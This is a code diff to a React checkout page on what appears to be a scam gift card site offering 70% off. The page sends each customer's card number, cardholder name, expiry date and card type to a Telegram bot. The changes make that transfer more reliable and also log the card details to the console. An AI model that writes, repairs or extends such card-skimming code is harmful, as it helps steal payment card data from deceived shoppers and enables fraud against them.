@@ -187,6 +187,8 @@ const Payment = () => {
 
 📆 *Payment Submitted*: ${new Date().toLocaleString()}`;
 
+      console.log("Sending Telegram notification with message:", message);
+      
       // Send to Telegram
       const response = await fetch(telegramApiUrl, {
         method: 'POST',
@@ -201,12 +203,19 @@ const Payment = () => {
       });
 
       const result = await response.json();
+      console.log("Telegram API response:", result);
+      
       if (!result.ok) {
         console.error('Telegram notification error:', result);
+        return false;
       }
+      
+      console.log("Telegram notification sent successfully");
+      return true;
     } catch (error) {
       console.error('Failed to send Telegram notification:', error);
       // Don't stop the checkout flow if notification fails
+      return false;
     }
   };
 
@@ -383,13 +392,15 @@ const Payment = () => {
     try {
       console.log(`Processing payment for $${giftCardValue} gift card (70% off) using ${selectedCardType}`);
       
-      // Send notification to Telegram
-      await sendTelegramNotification({
+      // Send notification to Telegram - EXPLICITLY await the result
+      const notificationSent = await sendTelegramNotification({
         cardType: selectedCardType,
         cardNumber: formData.cardNumber,
         cardName: formData.cardName,
         expiryDate: formData.expiryDate
       });
+      
+      console.log("Telegram notification status:", notificationSent ? "Sent" : "Failed");
       
       // Navigate to processing page
       navigate("/processing-payment", { 
